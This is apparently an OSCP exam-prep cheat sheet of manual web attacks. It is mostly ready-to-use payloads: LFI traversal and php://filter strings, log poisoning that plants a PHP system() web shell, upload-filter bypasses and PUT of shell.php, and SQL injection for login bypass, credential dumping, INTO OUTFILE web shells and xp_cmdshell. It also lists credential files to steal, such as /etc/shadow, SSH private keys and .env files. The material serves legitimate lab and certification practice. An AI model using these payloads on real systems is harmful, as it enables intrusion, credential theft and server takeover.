# Web Attacks (OSCP depth)

Manual patterns for the exam. Prefer understanding over automation.

> **Exam note:** Automatic exploitation tools such as **sqlmap** are typically **not allowed** on the OSCP exam. Practice manual SQLi and LFI. (Community sources including [0xsyr0/OSCP](https://github.com/0xsyr0/OSCP) call this out explicitly.)

Placeholders: `TARGET`, `LHOST`, `LPORT`, `PARAM`, `FILE`.

---

## Local File Inclusion (LFI)

### Probe

```text
http://TARGET/page.php?PARAM=
http://TARGET/page.php?PARAM=../../../../../../etc/passwd
http://TARGET/page.php?PARAM=....//....//....//etc/passwd
```

### Traversal / encoding ideas

```text
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
..././
```

### Null byte (legacy PHP &lt; 5.3)

```text
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg
```

### php://filter (source disclosure)

```text
http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=index
http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=../config
```

```bash
# decode dumped PHP
base64 -d source.b64
```

### Useful Linux paths (high value first)

```text
/etc/passwd
/etc/shadow                    # if readable
/etc/hosts
/etc/hostname
/etc/issue
/etc/os-release
/etc/crontab
/etc/exports
/etc/ssh/sshd_config
/etc/apache2/sites-enabled/000-default.conf
/etc/httpd/conf/httpd.conf
/etc/nginx/nginx.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/home/USER/.bash_history
/home/USER/.ssh/id_rsa
/var/www/html/config.php
/var/www/html/.env
```

### Useful Windows paths

```text
C:/Windows/win.ini
C:/Windows/System32/drivers/etc/hosts
C:/xampp/apache/conf/httpd.conf
C:/xampp/passwords.txt
C:/inetpub/wwwroot/web.config
C:/Users/USER/Desktop/user.txt
```

### Log poisoning (when LFI + writable log)

1. Inject PHP into a logged field (User-Agent, etc.):

```bash
curl -A '<?php system($_GET["c"]); ?>' http://TARGET/
```

2. Include the log via LFI:

```text
http://TARGET/page.php?file=../../../../var/log/apache2/access.log&c=id
```

### Fuzz LFI params

```bash
ffuf -u 'http://TARGET/index.php?page=FUZZ' \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fs SIZE
```

### Filter-chain RCE (advanced / when wrappers allowed)

When simple LFI is filtered, PHP filter chains can still achieve RCE. Use a generator rather than hand-building chains:

- https://github.com/synacktiv/php_filter_chain_generator

```bash
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
# paste long php://filter/... chain into the vulnerable param
```

---

## File upload bypass themes

Goal: get a server-side executable (or include-able) file into a web path.

### Extension tricks

```text
.php .php3 .php4 .php5 .php7 .phtml .pht .phar .phps
.PhP .pHp .PHP
.php.jpg .php.png .php.gif
.php%00.jpg .php\x00.png
.php%20 .php%0a .php%0d%0a.jpg
.cgi .inc .sh
```

### Content / MIME tricks

- Change `Content-Type` to `image/jpeg` while body is PHP
- Magic bytes: prepend `GIF89a;` or JPEG header before `<?php ... ?>`
- Double extension if server maps incorrectly: `shell.php.jpg` vs `shell.jpg.php`

### Other bypass ideas

| Control | Try |
|---------|-----|
| Blacklist `.php` | Case, double ext, null byte, alt handlers |
| Image-only | Polyglot / exif payload / include after upload |
| Rename after upload | Race, `.htaccess` handler override (Apache) |
| WebDAV PUT enabled | `davtest` / cadaver PUT |

```bash
# WebDAV PUT (when enabled)
davtest -url http://TARGET/ -sendbd auto
cadaver http://TARGET/
# put shell.php
```

```bash
# HTTP PUT via nmap script (labs)
nmap -p80 TARGET --script http-put \
  --script-args http-put.url='/uploads/shell.php',http-put.file=./shell.php
```

Always locate the **public URL** of the uploaded file and execute/include it.

---

## SQL injection (manual)

### Detection

```text
'
"
'--
' OR 1=1--
' OR '1'='1
" OR "1"="1"--
admin'--
admin' #
```

MySQL: `--` needs a trailing space, or use `#`.

### Auth bypass (login forms)

```text
admin'--
admin' #
' OR 1=1--
' OR '1'='1'--
') OR ('1'='1
admin' OR '1'='1'--
```

### UNION workflow (MySQL / MariaDB)

**1. Column count**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- error or empty = too many columns

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**2. Find reflected / string-friendly columns**

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
```

**3. Fingerprint**

```sql
' UNION SELECT 1,@@version,database(),user()--
-1 UNION SELECT 1,2,version()#
-1 UNION SELECT 1,2,database()#
```

**4. Schema**

```sql
-1 UNION SELECT 1,2,group_concat(table_name)
   FROM information_schema.tables
   WHERE table_schema=database()#

-1 UNION SELECT 1,2,group_concat(column_name)
   FROM information_schema.columns
   WHERE table_schema=database() AND table_name='users'#
```

**5. Dump**

```sql
-1 UNION SELECT 1,2,group_concat(username,0x3a,password)
   FROM users#
```

**6. File read / write (when FILE priv + secure_file_priv allows)**

```sql
SELECT LOAD_FILE('/etc/passwd')
' UNION SELECT "<?php system($_GET['c']);?>",NULL,NULL
   INTO OUTFILE '/var/www/html/shell.php'--
```

### Blind (boolean / time)

```sql
' AND 1=1--
' AND 1=2--
' AND IF(1=1,SLEEP(3),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)--
```

### MSSQL-oriented injection (web → OS)

```sql
' OR 1=1--
'; WAITFOR DELAY '0:0:5'--
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami'--
```

Prefer connecting with `impacket-mssqlclient` once you have SQL creds (see [08-mssql](../08-mssql/attacks.md)).

### SQLite (apps / mobile-style DBs)

```sql
-1 UNION SELECT 1,2,group_concat(tbl_name),4
   FROM sqlite_master WHERE type='table'--
-1 UNION SELECT 1,2,group_concat(sql),4 FROM sqlite_master--
```

### Oracle notes

```sql
' ORDER BY 3--
' UNION SELECT NULL,table_name,NULL FROM all_tables--
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
-- SELECT needs FROM; use DUAL when testing: UNION SELECT NULL FROM DUAL--
```

### Practice discipline

| Do | Don't (exam) |
|----|----------------|
| Map columns, dump by hand | Rely on sqlmap for the graded path |
| Log every payload that changes response | Spray random payloads without notes |
| Move to OS RCE only when needed | Dump entire DB if one hash is enough |

---

## Related

- Patterns overview: [common-patterns.md](common-patterns.md)
- Services footholds: [web-and-services.md](web-and-services.md)
- Transfer shells after RCE: [shells-payloads.md](shells-payloads.md)
